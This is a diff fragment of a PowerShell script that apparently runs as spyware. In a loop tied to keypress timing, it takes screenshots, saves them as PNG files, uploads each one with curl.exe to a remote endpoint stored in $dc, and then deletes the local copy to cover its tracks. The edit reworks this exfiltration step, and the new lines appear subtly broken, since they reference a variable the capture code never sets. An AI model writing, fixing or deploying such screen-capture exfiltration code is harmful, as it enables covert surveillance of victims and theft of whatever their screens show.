@@ -91,10 +91,10 @@ while ($true) {
             $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
             $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
             $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
-            $curlProcess = Start-Process -FilePath "curl.exe" -ArgumentList "-F", "file1=@$filePath", $dc -PassThru -Wait
-                if ($curlProcess.ExitCode -eq 0) {
-                    Remove-Item -Path $Filett
-                }
+            $arguments = "curl.exe -F `"file1=@$file`" $dc"
+            $curlProcess = Start-Process -FilePath 'curl.exe' -ArgumentList $arguments -PassThru
+            $curlProcess.WaitForExit()
+            Remove-Item -Path $Filett
         }
     }
     $LastKeypressTime.Restart()
